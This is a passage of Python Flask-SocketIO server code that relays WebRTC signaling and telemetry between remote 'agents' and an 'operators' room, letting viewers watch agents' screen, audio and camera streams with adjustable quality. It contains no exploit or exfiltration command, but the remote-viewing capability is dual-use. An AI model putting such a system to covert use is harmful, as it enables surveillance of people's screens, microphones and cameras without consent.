        AGENTS_DATA[agent_id]['cpu_usage'] = data.get('cpu', 0)
        AGENTS_DATA[agent_id]['memory_usage'] = data.get('memory', 0)
        AGENTS_DATA[agent_id]['network_usage'] = data.get('network', 0)
        AGENTS_DATA[agent_id]['last_seen'] = datetime.datetime.utcnow().isoformat() + "Z"
        try:
            latency = float(data.get('latency_ms') or data.get('latency') or 0)
            loss = float(data.get('packet_loss') or 0)
            mgr = getattr(handle_agent_telemetry, '_mgr', None)
            if mgr is None:
                mgr = AdaptiveStreamingManager()
                handle_agent_telemetry._mgr = mgr
            mgr.adjust_quality(agent_id, latency, loss)
            q = mgr.agent_quality.get(agent_id)
            if q:
                AGENT_FEATURE_FLAGS[agent_id]['quality_level'] = q
        except Exception:
            pass
        emit('agent_telemetry', {
            'agent_id': agent_id,
            'cpu': AGENTS_DATA[agent_id]['cpu_usage'],
            'memory': AGENTS_DATA[agent_id]['memory_usage'],
            'network': AGENTS_DATA[agent_id]['network_usage']
        }, room='operators')
        emit('agent_list_update', _agents_payload(), room='operators')

# --- WebRTC Socket.IO Event Handlers ---

@socketio.on('webrtc_offer')
def handle_webrtc_offer(data):
    """Handle WebRTC offer from agent"""
    agent_id = data.get('agent_id')
    offer_sdp = data.get('offer') or data.get('offer_sdp')
    sid = request.sid
    
    if not agent_id or not offer_sdp:
        emit('webrtc_error', {'message': 'Invalid offer data'}, room=sid)
        return
    
    try:
        # Create or get existing peer connection
        if agent_id not in WEBRTC_PEER_CONNECTIONS:
            pc = create_webrtc_peer_connection(agent_id)
            if not pc:
                emit('webrtc_error', {'message': 'Failed to create peer connection'}, room=sid)
                return
        else:
            pc = WEBRTC_PEER_CONNECTIONS[agent_id]
        
        # Set remote description (offer)
        offer = RTCSessionDescription(sdp=offer_sdp, type='offer')
        
        # Use proper async handling for WebRTC operations
        def handle_webrtc_offer_async(target_sid: str):
            try:
                loop = asyncio.get_event_loop()
                # Set remote description
                asyncio.run_coroutine_threadsafe(pc.setRemoteDescription(offer), loop)
                
                # Ensure we have transceivers matching offered media sections
                try:
                    v_count = offer_sdp.count("m=video")
                    a_count = offer_sdp.count("m=audio")
                    for _ in range(max(1, v_count)):
                        try:
                            pc.addTransceiver("video", direction="recvonly")
                        except Exception:
                            pass
                    for _ in range(max(1, a_count)):
                        try:
                            pc.addTransceiver("audio", direction="recvonly")
                        except Exception:
                            pass
                except Exception:
                    # Fallback to at least one recvonly transceiver each
                    try:
                        pc.addTransceiver("video", direction="recvonly")
                    except Exception:
                        pass
                    try:
                        pc.addTransceiver("audio", direction="recvonly")
                    except Exception:
                        pass
                # Create answer
                future = asyncio.run_coroutine_threadsafe(pc.createAnswer(), loop)
                future.add_done_callback(lambda f: handle_answer_created(f, agent_id, target_sid))
            except RuntimeError:
                # No event loop, run synchronously
                async def async_operations():
                    await pc.setRemoteDescription(offer)
                    # Match media sections in synchronous path too
                    try:
                        v_count = offer_sdp.count("m=video")
                        a_count = offer_sdp.count("m=audio")
                        for _ in range(max(1, v_count)):
                            try:
                                pc.addTransceiver("video", direction="recvonly")
                            except Exception:
                                pass
                        for _ in range(max(1, a_count)):
                            try:
                                pc.addTransceiver("audio", direction="recvonly")
                            except Exception:
                                pass
                    except Exception:
                        try:
                            pc.addTransceiver("video", direction="recvonly")
                        except Exception:
                            pass
                        try:
                            pc.addTransceiver("audio", direction="recvonly")
                        except Exception:
                            pass
                    answer = await pc.createAnswer()
                    handle_answer_created_sync(answer, agent_id, target_sid)
                asyncio.run(async_operations())
        
        # Run in thread to avoid blocking
        import threading
        threading.Thread(target=handle_webrtc_offer_async, args=(sid,), daemon=True).start()
        
        print(f"WebRTC offer received from {agent_id}")
        
    except Exception as e:
        print(f"Error handling WebRTC offer from {agent_id}: {e}")
        emit('webrtc_error', {'message': f'Error processing offer: {str(e)}'}, room=sid)

def handle_answer_created(future, agent_id, sid):
    """Handle WebRTC answer creation"""
    try:
        answer = future.result()
        
        # Use proper async handling for setLocalDescription
        try:
            loop = asyncio.get_event_loop()
            asyncio.run_coroutine_threadsafe(WEBRTC_PEER_CONNECTIONS[agent_id].setLocalDescription(answer), loop)
        except RuntimeError:
            # No event loop, run synchronously
            async def set_local_desc():
                await WEBRTC_PEER_CONNECTIONS[agent_id].setLocalDescription(answer)
            asyncio.run(set_local_desc())
        
        # Send answer back to agent
        socketio.emit('webrtc_answer', {
            'answer': answer.sdp,
            'sdp': answer.sdp,
            'type': answer.type
        }, room=sid)
        
        print(f"WebRTC answer sent to {agent_id}")
        
    except Exception as e:
        print(f"Error creating WebRTC answer for {agent_id}: {e}")
        socketio.emit('webrtc_error', {'message': f'Error creating answer: {str(e)}'}, room=sid)

def handle_answer_created_sync(answer, agent_id, sid):
    """Handle WebRTC answer creation for synchronous context"""
    try:
        # Send answer back to agent
        socketio.emit('webrtc_answer', {
            'answer': answer.sdp,
            'sdp': answer.sdp,
            'type': answer.type
        }, room=sid)
        
        print(f"WebRTC answer sent to {agent_id}")
        
    except Exception as e:
        print(f"Error sending WebRTC answer for {agent_id}: {e}")
        socketio.emit('webrtc_error', {'message': f'Error sending answer: {str(e)}'}, room=sid)

@socketio.on('webrtc_ice_candidate')
def handle_webrtc_ice_candidate(data):
    """Handle ICE candidate from agent"""
    agent_id = data.get('agent_id')
    candidate = data.get('candidate')
    
    if not agent_id or not candidate or agent_id not in WEBRTC_PEER_CONNECTIONS:
        return
    
    try:
        pc = WEBRTC_PEER_CONNECTIONS[agent_id]
        if isinstance(candidate, dict):
            candidate = RTCIceCandidate(
                sdpMid=candidate.get('sdpMid'),
                sdpMLineIndex=candidate.get('sdpMLineIndex'),
                candidate=candidate.get('candidate')
            )
        
        # Use proper async handling for addIceCandidate
        try:
            loop = asyncio.get_event_loop()
            asyncio.run_coroutine_threadsafe(pc.addIceCandidate(candidate), loop)
        except RuntimeError:
            # No event loop, run synchronously
            async def add_ice_candidate():
                await pc.addIceCandidate(candidate)
            asyncio.run(add_ice_candidate())
            
        print(f"ICE candidate added for {agent_id}")
        
    except Exception as e:
        print(f"Error adding ICE candidate for {agent_id}: {e}")

# @socketio.on('webrtc_start_streaming')
# def handle_webrtc_start_streaming(data):
#     """Handle WebRTC streaming start request"""
#     agent_id = data.get('agent_id')
#     stream_type = data.get('type', 'all')  # screen, audio, camera, all
#     
#     if not agent_id:
#         emit('webrtc_error', {'message': 'Agent ID required'}, room=request.sid)
#         return
#     
#     try:
#         # Ensure peer connection exists
#         if agent_id not in WEBRTC_PEER_CONNECTIONS:
#             pc = create_webrtc_peer_connection(agent_id)
#             if not pc:
#                 emit('webrtc_error', {'message': 'Failed to create peer connection'}, room=request.sid)
#                 return
#         
#         # Notify agent to start WebRTC streaming
#         emit('start_webrtc_streaming', {
#             'type': stream_type,
#             'ice_servers': WEBRTC_CONFIG['ice_servers'],
#             'codecs': WEBRTC_CONFIG['codecs']
#         }, room=request.sid)
#         
#         print(f"WebRTC streaming started for {agent_id} ({stream_type})")
#         
#     except Exception as e:
#         print(f"Error starting WebRTC streaming for {agent_id}: {e}")
#         emit('webrtc_error', {'message': f'Error starting streaming: {str(e)}'}, room=request.sid)

# @socketio.on('webrtc_stop_streaming')
# def handle_webrtc_stop_streaming(data):
#     """Handle WebRTC streaming stop request"""
#     agent_id = data.get('agent_id')
#     
#     if not agent_id:
#         emit('webrtc_error', {'message': 'Agent ID required'}, room=request.sid)
#         return
#     
#     try:
#         # Close WebRTC connection
#         close_webrtc_connection(agent_id)
#         
#         # Notify agent to stop WebRTC streaming
#         emit('stop_webrtc_streaming', {}, room=request.sid)
#         
#         print(f"WebRTC streaming stopped for {agent_id}")
#         
#     except Exception as e:
#         print(f"Error stopping WebRTC streaming for {agent_id}: {e}")
#         emit('webrtc_error', {'message': f'Error stopping streaming: {str(e)}'}, room=request.sid)

@socketio.on('webrtc_get_stats')
def handle_webrtc_get_stats(data):
    """Handle WebRTC stats request"""
    agent_id = data.get('agent_id')
    
    if not agent_id:
        emit('webrtc_error', {'message': 'Agent ID required'}, room=request.sid)
        return
    
    try:
        stats = get_webrtc_stats(agent_id)
        if stats:
            emit('webrtc_stats', stats, room=request.sid)
        else:
            emit('webrtc_error', {'message': 'No WebRTC connection found'}, room=request.sid)
        
    except Exception as e:
        print(f"Error getting WebRTC stats for {agent_id}: {e}")
        emit('webrtc_error', {'message': f'Error getting stats: {str(e)}'}, room=request.sid)

@socketio.on('webrtc_set_quality')
def handle_webrtc_set_quality(data):
    """Handle WebRTC quality settings"""
    agent_id = data.get('agent_id')
    quality = data.get('quality', 'auto')  # low, medium, high, auto
    
    if not agent_id:
        emit('webrtc_error', {'message': 'Agent ID required'}, room=request.sid)
        return
    
    try:
        agent_sid = AGENTS_DATA.get(agent_id, {}).get('sid')
        if agent_sid:
            try:
                q = str(quality).lower()
                if q == 'poor' or q == 'very_low':
                    STREAM_CHUNK_SIZES[agent_id] = 4 * 1024
                    STREAM_BIN_CHUNK_SIZES[agent_id] = 4 * 1024
                elif q == 'low':
                    STREAM_CHUNK_SIZES[agent_id] = 8 * 1024
                    STREAM_BIN_CHUNK_SIZES[agent_id] = 8 * 1024
                elif q == 'medium':
                    STREAM_CHUNK_SIZES[agent_id] = 16 * 1024
                    STREAM_BIN_CHUNK_SIZES[agent_id] = 16 * 1024
                elif q == 'high':
                    STREAM_CHUNK_SIZES[agent_id] = 32 * 1024
                    STREAM_BIN_CHUNK_SIZES[agent_id] = 32 * 1024
                else:
                    STREAM_CHUNK_SIZES[agent_id] = STREAM_CHUNK_SIZE_DEFAULT
                    STREAM_BIN_CHUNK_SIZES[agent_id] = STREAM_BIN_CHUNK_SIZE_DEFAULT
            except Exception:
                pass
            # Forward quality setting for WebRTC-capable agents
            emit('webrtc_set_quality', {'quality': quality, 'fps': 30}, room=agent_sid)
            # For fallback (Socket.IO) streaming, translate quality to screen params
            try:
                if q == 'low':
                    params = {'type': 'screen', 'fps': 15, 'max_width': 854, 'jpeg_quality': 50, 'delta': True, 'tile_size': 64, 'diff_threshold': 10}
                elif q == 'medium':
                    params = {'type': 'screen', 'fps': 15, 'max_width': 1280, 'jpeg_quality': 60, 'delta': True, 'tile_size': 64, 'diff_threshold': 8}
                elif q == 'high':
                    params = {'type': 'screen', 'fps': 20, 'max_width': 1280, 'jpeg_quality': 70, 'delta': True, 'tile_size': 64, 'diff_threshold': 6}
                else:
                    params = {'type': 'screen', 'fps': 15, 'max_width': 1280, 'jpeg_quality': 60, 'delta': True, 'tile_size': 64, 'diff_threshold': 8}
                emit('set_stream_params', params, room=agent_sid)
            except Exception:
                pass
            print(f"WebRTC quality set to {quality} for {agent_id}")
        else:
            emit('webrtc_error', {'message': f'Agent {agent_id} not connected'}, room=request.sid)
    
    except Exception as e:
        print(f"Error setting WebRTC quality for {agent_id}: {e}")
        emit('webrtc_error', {'message': f'Error setting quality: {str(e)}'}, room=request.sid)

# --- WebRTC Viewer Management ---

@socketio.on('webrtc_viewer_connect')
def handle_webrtc_viewer_connect(data):
    """Handle WebRTC viewer connection"""
    viewer_id = request.sid
    agent_id = data.get('agent_id')
    
    if not agent_id:
        emit('webrtc_error', {'message': 'Agent ID required'}, room=request.sid)
        return
    
    try:
        # Create viewer peer connection
        ice_cfg = [RTCIceServer(**srv) if isinstance(srv, dict) else RTCIceServer(srv) for srv in WEBRTC_CONFIG['ice_servers']]
        viewer_pc = RTCPeerConnection(configuration=RTCConfiguration(iceServers=ice_cfg))
        
        # Store viewer data
        WEBRTC_VIEWERS[viewer_id] = {
            'agent_id': agent_id,
            'pc': viewer_pc,
            'streams': {}
        }
        
        # Add existing tracks from agent (if any)
        try:
            agent_streams = WEBRTC_STREAMS.get(agent_id, {})
            for track_kind, tracks in agent_streams.items():
                try:
                    if isinstance(tracks, list):
                        for t in tracks:
                            sender = viewer_pc.addTrack(t)
                            if track_kind not in WEBRTC_VIEWERS[viewer_id]['streams']:
                                WEBRTC_VIEWERS[viewer_id]['streams'][track_kind] = []
                            WEBRTC_VIEWERS[viewer_id]['streams'][track_kind].append(sender)
                    else:
                        sender = viewer_pc.addTrack(tracks)
                        WEBRTC_VIEWERS[viewer_id]['streams'][track_kind] = [sender]
                except Exception as e:
                    print(f"Error adding track {track_kind} to viewer {viewer_id}: {e}")
        except Exception:
            pass
        # Ensure transceivers so offer has media sections even if tracks are not yet available
        try:
            viewer_pc.addTransceiver("video", direction="recvonly")
        except Exception:
            pass
        try:
            viewer_pc.addTransceiver("audio", direction="recvonly")
        except Exception:
            pass
        
        # Set up viewer event handlers
        @viewer_pc.on("connectionstatechange")
        async def on_viewer_connectionstatechange():
            print(f"Viewer {viewer_id} connection state: {viewer_pc.connectionState}")
            if viewer_pc.connectionState == "failed":
                await viewer_pc.close()
                if viewer_id in WEBRTC_VIEWERS:
                    del WEBRTC_VIEWERS[viewer_id]
        
        @viewer_pc.on("icecandidate")
        def on_viewer_icecandidate(candidate):
            if candidate:
                try:
                    emit('webrtc_ice_candidate', {
                        'agent_id': agent_id,
                        'candidate': getattr(candidate, 'candidate', None),
                        'sdpMid': getattr(candidate, 'sdpMid', None),
                        'sdpMLineIndex': getattr(candidate, 'sdpMLineIndex', None)
                    }, room=viewer_id)
                except Exception:
                    try:
                        emit('webrtc_ice_candidate', {
                            'agent_id': agent_id,
                            'candidate': candidate
                        }, room=viewer_id)
                    except Exception:
                        pass
        
        # Create offer for viewer
        def create_viewer_offer():
            try:
                loop = asyncio.get_event_loop()
                future = asyncio.run_coroutine_threadsafe(viewer_pc.createOffer(), loop)
                future.add_done_callback(lambda f: handle_viewer_offer_created(f, viewer_id))
            except RuntimeError:
                # No event loop, run synchronously
                async def create_offer():
                    offer = await viewer_pc.createOffer()
                    handle_viewer_offer_created_sync(offer, viewer_id)
                asyncio.run(create_offer())
        
        # Run in thread to avoid blocking
        threading.Thread(target=create_viewer_offer, daemon=True).start()
        
        print(f"WebRTC viewer {viewer_id} connected to agent {agent_id}")
        
    except Exception as e:
        print(f"Error connecting WebRTC viewer {viewer_id} to agent {agent_id}: {e}")
        emit('webrtc_error', {'message': f'Error connecting viewer: {str(e)}'}, room=request.sid)

def handle_viewer_offer_created(future, viewer_id):
    """Handle viewer offer creation"""
    try:
        offer = future.result()
        
        # Use proper async handling for setLocalDescription
        try:
            loop = asyncio.get_event_loop()
            asyncio.run_coroutine_threadsafe(WEBRTC_VIEWERS[viewer_id]['pc'].setLocalDescription(offer), loop)
        except RuntimeError:
            # No event loop, run synchronously
            async def set_local_desc():
                await WEBRTC_VIEWERS[viewer_id]['pc'].setLocalDescription(offer)
            asyncio.run(set_local_desc())
        
        # Send offer to viewer
        socketio.emit('webrtc_viewer_offer', {
            'offer': offer.sdp,
            'type': offer.type
        }, room=viewer_id)
        
        print(f"WebRTC viewer offer sent to {viewer_id}")
        
    except Exception as e:
        print(f"Error creating WebRTC viewer offer for {viewer_id}: {e}")
        socketio.emit('webrtc_error', {'message': f'Error creating viewer offer: {str(e)}'}, room=viewer_id)

def handle_viewer_offer_created_sync(offer, viewer_id):
    """Handle viewer offer creation for synchronous context"""
    try:
        # Send offer to viewer
        socketio.emit('webrtc_viewer_offer', {
            'offer': offer.sdp,
            'type': offer.type
        }, room=viewer_id)
        
        print(f"WebRTC viewer offer sent to {viewer_id}")
        
    except Exception as e:
        print(f"Error sending WebRTC viewer offer for {viewer_id}: {e}")
        socketio.emit('webrtc_error', {'message': f'Error sending viewer offer: {str(e)}'}, room=viewer_id)

@socketio.on('webrtc_viewer_answer')
def handle_webrtc_viewer_answer(data):
    """Handle viewer answer"""
    viewer_id = request.sid
    answer_sdp = data.get('answer')
    
    if not answer_sdp or viewer_id not in WEBRTC_VIEWERS:
        return
    
    try:
        viewer_pc = WEBRTC_VIEWERS[viewer_id]['pc']
        answer = RTCSessionDescription(sdp=answer_sdp, type='answer')
        
        # Use proper async handling for setRemoteDescription
        try:
            loop = asyncio.get_event_loop()
            asyncio.run_coroutine_threadsafe(viewer_pc.setRemoteDescription(answer), loop)
        except RuntimeError:
            # No event loop, run synchronously
            async def set_remote_desc():
                await viewer_pc.setRemoteDescription(answer)
            asyncio.run(set_remote_desc())
            
        print(f"WebRTC viewer answer received from {viewer_id}")
        
    except Exception as e:
        print(f"Error setting viewer answer for {viewer_id}: {e}")

@socketio.on('webrtc_viewer_ice_candidate')
def handle_webrtc_viewer_ice_candidate(data):
    """Handle ICE candidate from viewer"""
    viewer_id = request.sid
    candidate = data.get('candidate')
    
    if not candidate or viewer_id not in WEBRTC_VIEWERS:
        return
    
    try:
        viewer_pc = WEBRTC_VIEWERS[viewer_id]['pc']
        if isinstance(candidate, dict):
            try:
                candidate = RTCIceCandidate(
                    sdpMid=candidate.get('sdpMid'),
                    sdpMLineIndex=candidate.get('sdpMLineIndex'),
                    candidate=candidate.get('candidate')
                )
            except Exception:
                pass
        try:
            loop = asyncio.get_event_loop()
            asyncio.run_coroutine_threadsafe(viewer_pc.addIceCandidate(candidate), loop)
        except RuntimeError:
            async def add_ice():
                await viewer_pc.addIceCandidate(candidate)
            asyncio.run(add_ice())
        print(f"Viewer ICE candidate added for {viewer_id}")
    except Exception as e:
        print(f"Error adding viewer ICE candidate for {viewer_id}: {e}")

@socketio.on('webrtc_viewer_disconnect')
def handle_webrtc_viewer_disconnect():
    """Handle WebRTC viewer disconnection"""
    viewer_id = request.sid
    
    if viewer_id in WEBRTC_VIEWERS:
        try:
            viewer_pc = WEBRTC_VIEWERS[viewer_id]['pc']
            
            # Use proper async handling for close
            try:
                loop = asyncio.get_event_loop()
                asyncio.run_coroutine_threadsafe(viewer_pc.close(), loop)
            except RuntimeError:
                # No event loop, run synchronously
                async def close_viewer():
                    await viewer_pc.close()
                asyncio.run(close_viewer())
                
            del WEBRTC_VIEWERS[viewer_id]
            print(f"WebRTC viewer {viewer_id} disconnected")
        except Exception as e:
            print(f"Error disconnecting WebRTC viewer {viewer_id}: {e}")

# Advanced WebRTC Monitoring and Optimization Event Handlers
@socketio.on('webrtc_quality_change')
def handle_webrtc_quality_change(data):
    """Handle WebRTC quality change requests from adaptive bitrate control"""
    agent_id = data.get('agent_id')
    quality = data.get('quality')
    bandwidth_stats = data.get('bandwidth_stats')
    
    print(f"Quality change request for {agent_id}: {quality}")
    print(f"Bandwidth stats: {bandwidth_stats}")
    
    # Forward quality change to agent
    agent_sid = AGENTS_DATA.get(agent_id, {}).get('sid')
    if agent_sid:
        emit('webrtc_quality_change', {
            'quality': quality,
            'quality_level': quality,
            'bandwidth_stats': bandwidth_stats
        }, room=agent_sid)
        print(f"Quality change command sent to agent {agent_id}")
    else:
        print(f"Agent {agent_id} not found for quality change")
    try:
        q = str(quality).lower()
        if q == 'poor' or q == 'very_low':
            STREAM_CHUNK_SIZES[agent_id] = 4 * 1024
            STREAM_BIN_CHUNK_SIZES[agent_id] = 4 * 1024
        elif q == 'low':
            STREAM_CHUNK_SIZES[agent_id] = 8 * 1024
            STREAM_BIN_CHUNK_SIZES[agent_id] = 8 * 1024
        elif q == 'medium':
            STREAM_CHUNK_SIZES[agent_id] = 16 * 1024
            STREAM_BIN_CHUNK_SIZES[agent_id] = 16 * 1024
        elif q == 'high':
            STREAM_CHUNK_SIZES[agent_id] = 32 * 1024
            STREAM_BIN_CHUNK_SIZES[agent_id] = 32 * 1024
        else:
            STREAM_CHUNK_SIZES[agent_id] = STREAM_CHUNK_SIZE_DEFAULT
            STREAM_BIN_CHUNK_SIZES[agent_id] = STREAM_BIN_CHUNK_SIZE_DEFAULT
    except Exception:
        pass
    try:
        # Also update fallback (Socket.IO) screen params for steady FPS streaming
        if agent_sid:
            try:
                if q == 'low':
                    params = {'type': 'screen', 'fps': 15, 'max_width': 854, 'jpeg_quality': 50}
                elif q == 'medium':
                    params = {'type': 'screen', 'fps': 15, 'max_width': 1280, 'jpeg_quality': 60}
                elif q == 'high':
                    params = {'type': 'screen', 'fps': 20, 'max_width': 1280, 'jpeg_quality': 70}
                else:
                    params = {'type': 'screen', 'fps': 15, 'max_width': 1280, 'jpeg_quality': 60}
                emit('set_stream_params', params, room=agent_sid)
            except Exception:
                pass
    except Exception:
        pass

@socketio.on('webrtc_frame_dropping')
def handle_webrtc_frame_dropping(data):
    """Handle WebRTC frame dropping requests from load monitoring"""
    agent_id = data.get('agent_id')
    enabled = data.get('enabled')
    drop_ratio = data.get('drop_ratio', 0.3)
    priority = data.get('priority', 'keyframes_only')
    
    print(f"Frame dropping request for {agent_id}: enabled={enabled}, ratio={drop_ratio}, priority={priority}")
    
    # Forward frame dropping command to agent
    agent_sid = AGENTS_DATA.get(agent_id, {}).get('sid')
    if agent_sid:
        emit('webrtc_frame_dropping', {
            'enabled': enabled,
            'drop_ratio': drop_ratio,
            'priority': priority
        }, room=agent_sid)
        print(f"Frame dropping command sent to agent {agent_id}")
    else:
        print(f"Agent {agent_id} not found for frame dropping")

@socketio.on('webrtc_get_enhanced_stats')
def handle_webrtc_get_enhanced_stats(data):
    """Get enhanced WebRTC statistics including performance metrics"""
    agent_id = data.get('agent_id')
    
    if not agent_id:
        emit('webrtc_enhanced_stats', {'error': 'Agent ID required'}, room=request.sid)
        return
    
    try:
        # Get basic stats
        basic_stats = get_webrtc_stats(agent_id)
        
        # Get bandwidth estimation
        bandwidth_stats = estimate_bandwidth(agent_id)
        
        # Get connection quality
        quality_data = monitor_connection_quality(agent_id)
        
        # Get production readiness assessment
        production_readiness = assess_production_readiness()
        
        enhanced_stats = {
            'agent_id': agent_id,
            'basic_stats': basic_stats,
            'bandwidth_stats': bandwidth_stats,
            'quality_data': quality_data,
            'production_readiness': production_readiness,
            'timestamp': datetime.datetime.now().isoformat()
        }
        
        emit('webrtc_enhanced_stats', enhanced_stats, room=request.sid)
        print(f"Enhanced stats sent for agent {agent_id}")
        
    except Exception as e:
        print(f"Error getting enhanced stats for {agent_id}: {e}")
        emit('webrtc_enhanced_stats', {'error': str(e)}, room=request.sid)

@socketio.on('webrtc_get_production_readiness')
def handle_webrtc_get_production_readiness():
    """Get production readiness assessment"""
    try:
        readiness_report = assess_production_readiness()
        emit('webrtc_production_readiness', readiness_report, room=request.sid)
        print("Production readiness report sent")
    except Exception as e:
        print(f"Error getting production readiness: {e}")
        emit('webrtc_production_readiness', {'error': str(e)}, room=request.sid)

@socketio.on('webrtc_get_migration_plan')
def handle_webrtc_get_migration_plan():
    """Get mediasoup migration plan"""
    try:
        migration_plan = generate_mediasoup_migration_plan()
        emit('webrtc_migration_plan', migration_plan, room=request.sid)
        print("Mediasoup migration plan sent")
    except Exception as e:
        print(f"Error getting migration plan: {e}")
        emit('webrtc_migration_plan', {'error': str(e)}, room=request.sid)

@socketio.on('webrtc_get_monitoring_data')
def handle_webrtc_get_monitoring_data():
    """Get comprehensive WebRTC monitoring data"""
    try:
        monitoring_data = enhanced_webrtc_monitoring()
        emit('webrtc_monitoring_data', monitoring_data, room=request.sid)
        print("Comprehensive monitoring data sent")
    except Exception as e:
        print(f"Error getting monitoring data: {e}")
        emit('webrtc_monitoring_data', {'error': str(e)}, room=request.sid)

@socketio.on('webrtc_adaptive_bitrate_control')
def handle_webrtc_adaptive_bitrate_control(data):
    """Manually trigger adaptive bitrate control"""
    agent_id = data.get('agent_id')
    current_quality = data.get('current_quality', 'auto')
    
    if not agent_id:
        emit('webrtc_adaptive_bitrate_result', {'error': 'Agent ID required'}, room=request.sid)
        return
    
    try:
        result = adaptive_bitrate_control(agent_id, current_quality)
        emit('webrtc_adaptive_bitrate_result', {
            'agent_id': agent_id,
            'result': result,
            'timestamp': datetime.datetime.now().isoformat()
        }, room=request.sid)
        print(f"Adaptive bitrate control result for {agent_id}: {result}")
    except Exception as e:
        print(f"Error in adaptive bitrate control for {agent_id}: {e}")
        emit('webrtc_adaptive_bitrate_result', {'error': str(e)}, room=request.sid)

@socketio.on('webrtc_implement_frame_dropping')
def handle_webrtc_implement_frame_dropping(data):
    """Manually trigger frame dropping implementation"""
    agent_id = data.get('agent_id')
    load_threshold = data.get('load_threshold', 0.8)
    
    if not agent_id:
        emit('webrtc_frame_dropping_result', {'error': 'Agent ID required'}, room=request.sid)
        return
    
    try:
        result = implement_frame_dropping(agent_id, load_threshold)
        emit('webrtc_frame_dropping_result', {
            'agent_id': agent_id,
            'result': result,
            'load_threshold': load_threshold,
            'timestamp': datetime.datetime.now().isoformat()
        }, room=request.sid)
        print(f"Frame dropping implementation result for {agent_id}: {result}")
    except Exception as e:
        print(f"Error implementing frame dropping for {agent_id}: {e}")
        emit('webrtc_frame_dropping_result', {'error': str(e)}, room=request.sid)

# WebRTC scaffolding code removed - not currently active

@app.route('/api/webrtc/config', methods=['GET'])
def http_webrtc_config():
    try:
        return jsonify({
            'enabled': WEBRTC_CONFIG.get('enabled', False),
            'iceServers': WEBRTC_CONFIG.get('ice_servers', []),
            'codecs': WEBRTC_CONFIG.get('codecs', {}),
        })
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)}), 500

def _get_viewer_token():
    try:
        token = session.get('webrtc_viewer_id')
    except Exception:
        token = None
    if not token:
        token = secrets.token_hex(16)
        session['webrtc_viewer_id'] = token
    return token

@app.route('/api/webrtc/viewer/connect', methods=['POST'])
def http_webrtc_viewer_connect():
    if not WEBRTC_AVAILABLE:
        return jsonify({'success': False, 'error': 'WebRTC not available'}), 400
    data = request.get_json(silent=True) or {}
    agent_id = data.get('agent_id')
    if not agent_id:
        return jsonify({'success': False, 'error': 'Agent ID required'}), 400
    try:
        viewer_token = _get_viewer_token()
        ice_cfg = [RTCIceServer(**srv) if isinstance(srv, dict) else RTCIceServer(srv) for srv in WEBRTC_CONFIG['ice_servers']]
        viewer_pc = RTCPeerConnection(configuration=RTCConfiguration(iceServers=ice_cfg))
        WEBRTC_VIEWERS[viewer_token] = {
            'agent_id': agent_id,
            'pc': viewer_pc,
            'streams': {}
        }
        # Attach any existing agent tracks and also ensure transceivers exist even if no tracks yet
        try:
            agent_streams = WEBRTC_STREAMS.get(agent_id, {})
            for track_kind, tracks in agent_streams.items():
                try:
                    if isinstance(tracks, list):
                        for t in tracks:
                            sender = viewer_pc.addTrack(t)
                            if track_kind not in WEBRTC_VIEWERS[viewer_token]['streams']:
                                WEBRTC_VIEWERS[viewer_token]['streams'][track_kind] = []
                            WEBRTC_VIEWERS[viewer_token]['streams'][track_kind].append(sender)
                    else:
                        sender = viewer_pc.addTrack(tracks)
                        WEBRTC_VIEWERS[viewer_token]['streams'][track_kind] = [sender]
                except Exception:
                    pass
        except Exception:
            pass
        # Ensure m-lines for video/audio appear in offer so answer matches later when tracks arrive
        try:
            viewer_pc.addTransceiver("video", direction="recvonly")
        except Exception:
            pass
        try:
            viewer_pc.addTransceiver("audio", direction="recvonly")
        except Exception:
            pass
        try:
            loop = asyncio.get_event_loop()
            future = asyncio.run_coroutine_threadsafe(viewer_pc.createOffer(), loop)
            offer = future.result(timeout=5)
            try:
                asyncio.run_coroutine_threadsafe(viewer_pc.setLocalDescription(offer), loop)
            except RuntimeError:
                async def set_local_desc():
                    await viewer_pc.setLocalDescription(offer)
                asyncio.run(set_local_desc())
            return jsonify({'success': True, 'offer': offer.sdp, 'type': offer.type})
        except RuntimeError:
            async def create_offer_async():
                offer = await viewer_pc.createOffer()
                await viewer_pc.setLocalDescription(offer)
                return offer
            offer = asyncio.run(create_offer_async())
            return jsonify({'success': True, 'offer': offer.sdp, 'type': offer.type})
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)}), 500

@app.route('/api/webrtc/viewer/answer', methods=['POST'])
def http_webrtc_viewer_answer():
    data = request.get_json(silent=True) or {}
    answer_sdp = data.get('answer')
    token = session.get('webrtc_viewer_id')
    if not answer_sdp or not token or token not in WEBRTC_VIEWERS:
        return jsonify({'success': False, 'error': 'Invalid viewer session'}), 400
    try:
        viewer_pc = WEBRTC_VIEWERS[token]['pc']
        answer = RTCSessionDescription(sdp=answer_sdp, type='answer')
        try:
            loop = asyncio.get_event_loop()
            asyncio.run_coroutine_threadsafe(viewer_pc.setRemoteDescription(answer), loop)
        except RuntimeError:
            async def set_remote_desc():
                await viewer_pc.setRemoteDescription(answer)
            asyncio.run(set_remote_desc())
        return jsonify({'success': True})
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)}), 500

@app.route('/api/webrtc/viewer/ice', methods=['POST'])
def http_webrtc_viewer_ice():
    data = request.get_json(silent=True) or {}
    candidate = data.get('candidate')
    token = session.get('webrtc_viewer_id')
    if not candidate or not token or token not in WEBRTC_VIEWERS:
        return jsonify({'success': False, 'error': 'Invalid viewer session'}), 400
    try:
        viewer_pc = WEBRTC_VIEWERS[token]['pc']
        if isinstance(candidate, dict):
            try:
                candidate = RTCIceCandidate(
                    sdpMid=candidate.get('sdpMid'),
                    sdpMLineIndex=candidate.get('sdpMLineIndex'),
                    candidate=candidate.get('candidate')
                )
            except Exception:
                pass
        try:
            loop = asyncio.get_event_loop()
            asyncio.run_coroutine_threadsafe(viewer_pc.addIceCandidate(candidate), loop)
        except RuntimeError:
            async def add_ice():
                await viewer_pc.addIceCandidate(candidate)
            asyncio.run(add_ice())
        return jsonify({'success': True})
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)}), 500

@app.route('/api/webrtc/viewer/disconnect', methods=['POST'])
def http_webrtc_viewer_disconnect():
    token = session.get('webrtc_viewer_id')
    if not token or token not in WEBRTC_VIEWERS:
        return jsonify({'success': True})
    try:
        viewer_pc = WEBRTC_VIEWERS[token]['pc']
        try:
            loop = asyncio.get_event_loop()
            asyncio.run_coroutine_threadsafe(viewer_pc.close(), loop)
        except RuntimeError:
            async def close_viewer():
                await viewer_pc.close()
            asyncio.run(close_viewer())
    except Exception:
        pass
    try:
        del WEBRTC_VIEWERS[token]
    except Exception:
        pass
    return jsonify({'success': True})

# Additional WebSocket events for real-time updates

